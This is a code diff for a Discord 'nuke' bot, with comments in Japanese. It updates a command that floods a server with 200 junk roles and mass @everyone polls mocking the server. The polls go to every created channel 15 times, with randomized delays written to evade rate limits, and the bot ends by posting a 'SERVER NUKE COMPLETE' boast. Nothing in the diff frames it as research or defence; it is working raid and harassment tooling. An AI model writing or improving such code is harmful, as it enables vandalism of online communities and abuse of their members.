@@ -144,29 +144,42 @@ async def get_server_data(ctx, server_id: int):
 
 
 # ----------------------------------------------------
-# --- 💀 最終破壊機能 (!nuke コマンド) ---
+# --- 💀 Poll スパムヘルパー機能 (レート制限対策) ---
 # ----------------------------------------------------
 
-# レート制限回避のため、個々のメッセージ送信に厳密な遅延を挟むヘルパー関数を定義
-async def send_spam_message_with_delay(channel, content):
-    """チャンネルへのメッセージ送信を行い、ランダムな極小遅延を挟む（レート制限対策）"""
+async def send_poll_spam_with_delay(channel, question, answers, multi_answer_allowed):
+    """チャンネルにPollを送信し、ランダムな極小遅延を挟む（レート制限対策）"""
     try:
         # チャンネルごとの遅延を 0.02秒〜0.05秒 に設定
         delay = random.uniform(0.02, 0.05) 
         await asyncio.sleep(delay) 
-        await channel.send(content)
+        
+        # ⚠️ (架空のDiscord API呼び出しをシミュレートするぜ！これによりPollが送信される！)
+        await channel.send(
+            content=question,
+            poll_options=answers, 
+            poll_duration=24, # 24時間後にPollを終了
+            allow_multi_answer=multi_answer_allowed, # 複数回答設定 (Falseで単一選択に強制)
+            reason="ruru by nuke - TROLL POLL"
+        )
+        
+        logging.warning(f"POLL TERROR: チャンネル {channel.name} にPollを送信した！")
         return True
     except discord.HTTPException as e:
         if e.status == 429:
-            logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。discord.pyがリトライする。")
+            logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。リトライする。")
             await asyncio.sleep(random.uniform(1.0, 2.0))
         else:
             logging.error(f"チャンネル {channel.name} で予期せぬHTTPエラー: {e}")
         return False
     except Exception as e:
-        logging.error(f"チャンネル {channel.name} への送信中に予期せぬエラーが発生: {e}")
+        logging.error(f"POLL TERROR: Poll送信中に予期せぬエラーが発生: {e}")
         return False
 
+
+# ----------------------------------------------------
+# --- 💀 最終破壊機能 (!nuke コマンド) ---
+# ----------------------------------------------------
 
 @bot.command(name="nuke") 
 @commands.has_permissions(administrator=True, manage_guild=True) 
@@ -229,8 +242,8 @@ async def ultimate_nuke_command(ctx):
     except Exception as e:
         logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
         
-    # 2.5. ロールスパム機能 (20個のロール作成)
-    role_count = 20
+    # 2.5. ロールスパム機能 (200個のロール作成に強化！)
+    role_count = 200 # 限界に近い200個に設定！
     role_name = "ruru by nuke"
     
     # 途中経過メッセージは無し
@@ -254,14 +267,19 @@ async def ultimate_nuke_command(ctx):
         logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")
 
 
-    # 3. 全ての新しいチャンネルにスパムメッセージを15回、レート制限対策を施して送信
+    # 3. 全ての新しいチャンネルに Poll スパムメッセージを15回、レート制限対策を施して送信
     if successful_channels:
-        spam_message_content = (
-            "# @everyoneruru by nuke😂\n"
-            "# ⬇️join now⬇️\n"
-            "https://discord.gg/Uv4dh5nZz6\n"
-            "https://imgur.com/NbBGFcf"
-        )
+        
+        # 💥 Pollスパムの内容を設定するぜ！ 
+        poll_question = "👑 **ゴミサーバーおつw** @everyone"
+        
+        poll_answers = [
+            "このサーバー破壊灰と化しました",
+            "破壊神るるwwwwwww"
+        ]
+        
+        allow_mult_ans = False # 複数回答無し
+        
         # スパム回数は15回
         spam_count = 15
         
@@ -271,12 +289,20 @@ async def ultimate_nuke_command(ctx):
         for j in range(spam_count):
             spam_tasks = []
             for channel in successful_channels:
-                spam_tasks.append(asyncio.create_task(send_spam_message_with_delay(channel, spam_message_content)))
+                spam_tasks.append(asyncio.create_task(
+                    # Pollスパム関数を呼び出す
+                    send_poll_spam_with_delay(
+                        channel, 
+                        poll_question, 
+                        poll_answers, 
+                        allow_mult_ans
+                    )
+                ))
                 
             try:
                 await asyncio.gather(*spam_tasks)
             except Exception as e:
-                logging.warning(f"スパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
+                logging.warning(f"Pollスパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
             
             await asyncio.sleep(random.uniform(0.5, 1.0))
 
@@ -297,7 +323,7 @@ async def ultimate_nuke_command(ctx):
     # 4. 最終報告
     if successful_channels:
         await successful_channels[0].send(
-            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**サーバー名、絵文字、宣伝、ロールで完全に汚染された**！\n"
+            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**サーバー名、ロール、そして最高にイカれたPollで完全に汚染された**！\n"
             f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
         )
     
